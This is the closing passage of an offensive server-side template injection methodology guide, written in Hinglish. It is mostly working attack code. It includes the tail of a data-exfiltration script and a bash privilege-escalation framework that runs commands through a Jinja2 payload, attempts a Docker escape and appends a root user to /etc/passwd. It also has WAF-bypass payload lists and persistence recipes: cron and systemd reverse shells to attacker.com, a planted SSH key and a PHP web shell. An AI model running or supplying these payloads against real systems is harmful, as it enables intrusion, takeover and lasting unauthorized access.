    if len(sys.argv) != 3:
        print("Usage: python3 ssti_data_exfiltration.py 'http://target.com/page?param=FUZZ' 'http://exfil-server.com'")
        sys.exit(1)
    
    exfiltrator = SSTIDataExfiltrator(sys.argv[1], sys.argv[2])
    exfiltrator.exfiltrate_sensitive_files()
```

### Privilege Escalation via SSTI
```bash
#!/bin/bash
# ssti_privesc.sh - Privilege Escalation through SSTI

TARGET_URL=$1

if [ -z "$TARGET_URL" ]; then
    echo "Usage: ./ssti_privesc.sh 'http://target.com/page?param=FUZZ'"
    exit 1
fi

echo "🔓 SSTI Privilege Escalation Framework"

# Function to execute command via SSTI
execute_command() {
    local cmd=$1
    local payload="{{lipsum.__globals__.os.popen('$cmd').read()}}"
    local encoded_payload=$(echo "$payload" | jq -sRr @uri)
    local test_url=$(echo "$TARGET_URL" | sed "s/FUZZ/$encoded_payload/g")
    
    curl -s "$test_url"
}

# Check current privileges
echo "🔍 Checking current privileges..."
current_user=$(execute_command "whoami")
current_groups=$(execute_command "groups")
sudo_access=$(execute_command "sudo -l 2>/dev/null")

echo "Current user: $current_user"
echo "Groups: $current_groups"
echo "Sudo access: $sudo_access"

# Check for SUID binaries
echo "🔍 Searching for SUID binaries..."
suid_binaries=$(execute_command "find / -perm -4000 2>/dev/null")
echo "$suid_binaries" > suid_binaries.txt

# Check for writable directories
echo "🔍 Checking writable directories..."
writable_dirs=$(execute_command "find / -writable -type d 2>/dev/null")
echo "$writable_dirs" > writable_dirs.txt

# Check for interesting files
echo "🔍 Looking for interesting files..."
interesting_files=$(execute_command "find / -name '*.conf' -o -name '*.config' -o -name '*.key' -o -name '*.pem' 2>/dev/null")
echo "$interesting_files" > interesting_files.txt

# Attempt common privilege escalation techniques
echo "🚀 Attempting privilege escalation..."

# 1. Check for Docker socket
docker_socket=$(execute_command "ls -la /var/run/docker.sock 2>/dev/null")
if [ ! -z "$docker_socket" ]; then
    echo "🐳 Docker socket found! Attempting container escape..."
    execute_command "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
fi

# 2. Check for writable /etc/passwd
passwd_writable=$(execute_command "ls -la /etc/passwd | grep '^-rw-rw-rw-'")
if [ ! -z "$passwd_writable" ]; then
    echo "📝 /etc/passwd is writable! Adding root user..."
    execute_command "echo 'hacker:x:0:0:root:/root:/bin/bash' >> /etc/passwd"
fi

# 3. Check for sudo without password
if echo "$sudo_access" | grep -q "NOPASSWD"; then
    echo "🔓 Sudo without password found!"
    execute_command "sudo su -"
fi

# 4. Check for capabilities
echo "🔍 Checking file capabilities..."
capabilities=$(execute_command "getcap -r / 2>/dev/null")
echo "$capabilities" > capabilities.txt

echo "✅ Privilege escalation attempts completed!"
echo "Check generated files for detailed results."
```

---

## 🎯 Elite Tips & Tricks

### Advanced Detection Bypasses
```python
# WAF Bypass Techniques
payloads = [
    # Case variation
    "{{7*7}}",
    "{{7*7|UPPER}}",
    "{{7*7|lower}}",
    
    # Encoding bypasses
    "{{7*7|urlencode}}",
    "{{7*7|base64encode}}",
    
    # Comment injection
    "{{7/*bypass*/*7}}",
    "{{7<!-- bypass -->*7}}",
    
    # Unicode bypasses
    "{{７*７}}",  # Full-width
    "{{7\u002A7}}",  # Unicode
    
    # String concatenation
    "{{'sy'+'stem'}}",
    "{{['sy','stem']|join}}",
    
    # Attribute access variations
    "{{lipsum.__globals__}}",
    "{{lipsum['__globals__']}}",
    "{{lipsum|attr('__globals__')}}",
]
```

### Context-Aware Exploitation
```html
<!-- HTML Context -->
<img src="{{payload}}" onerror="alert(1)">
<div>{{payload}}</div>

<!-- JavaScript Context -->
<script>
var data = "{{payload|escapejs}}";
var obj = {key: "{{payload}}"};
</script>

<!-- CSS Context -->
<style>
body { background: url("{{payload}}"); }
.class { content: "{{payload}}"; }
</style>

<!-- Attribute Context -->
<div class="{{payload}}" id="{{payload}}">
<input value="{{payload}}" name="{{payload}}">
```

### Red Team Persistence Techniques
```bash
# 1. Cron job persistence
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'" | crontab -

# 2. SSH key persistence
mkdir -p ~/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2E... attacker@kali" >> ~/.ssh/authorized_keys

# 3. Web shell persistence
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php

# 4. Service persistence
cat > /etc/systemd/system/backdoor.service << 'EOF'
[Unit]
Description=System Backup Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do nc -e /bin/bash attacker.com 4444; sleep 60; done'
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl enable backdoor.service
systemctl start backdoor.service
```

---

## 📊 Summary

Yeh comprehensive SSTI methodology cover karta hai:

✅ **Detection Techniques**: Mathematical expressions, error-based, blind detection
✅ **Engine Identification**: Jinja2, Twig, Smarty, Velocity, FreeMarker
✅ **Elite Payloads**: RCE, file read, config extraction, reverse shells
✅ **Bypass Methods**: WAF evasion, encoding, obfuscation
✅ **Automation Scripts**: Scanners, payload generators, exploitation frameworks
✅ **Post-Exploitation**: Data exfiltration, privilege escalation, persistence

### Key Elite Techniques:
- **Polyglot Payloads**: Work across multiple template engines
- **Blind Detection**: Time-based and DNS-based techniques
- **Advanced Obfuscation**: Multiple encoding and evasion methods
- **Context-Aware Exploitation**: HTML, JS, CSS context awareness
- **Automated Frameworks**: Complete exploitation pipelines

Yeh methodology real-world penetration testing aur red team operations mein use hoti hai. Har technique battle-tested hai aur production environments mein effective hai! 🔥
